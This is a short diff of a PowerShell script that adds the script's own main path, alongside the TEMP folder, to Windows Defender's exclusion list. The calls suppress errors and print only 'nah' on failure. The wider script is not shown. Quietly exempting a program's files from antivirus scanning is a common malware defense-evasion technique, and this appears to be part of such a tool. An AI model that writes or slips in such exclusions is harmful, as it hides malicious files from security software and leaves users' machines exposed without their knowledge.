@@ -90,6 +90,7 @@ $MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
 
 try {
     Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
 } catch {
     Write-Host "nah"
 }
